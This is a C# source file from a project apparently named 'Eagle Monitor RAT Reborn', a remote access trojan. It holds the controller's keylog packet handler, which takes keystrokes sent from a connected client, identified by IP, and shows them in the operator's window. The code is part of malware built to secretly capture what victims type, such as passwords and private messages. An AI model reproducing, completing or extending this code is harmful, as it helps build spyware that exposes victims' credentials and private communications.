using Eagle_Monitor_RAT_Reborn.Network;
using PacketLib.Packet;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.PacketHandler
{
    internal class KeylogPacketHandler
    {
        public KeylogPacketHandler(KeylogPacket keylogPacket) : base()//, ClientHandler clientHandler) 
        {
            try
            {
                ClientHandler.ClientHandlersList[keylogPacket.BaseIp].ClientForm.keystrokeRichTextBox.BeginInvoke((MethodInvoker)(() =>
                {
                    ClientHandler.ClientHandlersList[keylogPacket.BaseIp].ClientForm.keystrokeRichTextBox.AppendText(keylogPacket.keyStroke);
                }));
            }
            catch { }
            return;
        }
    }
}
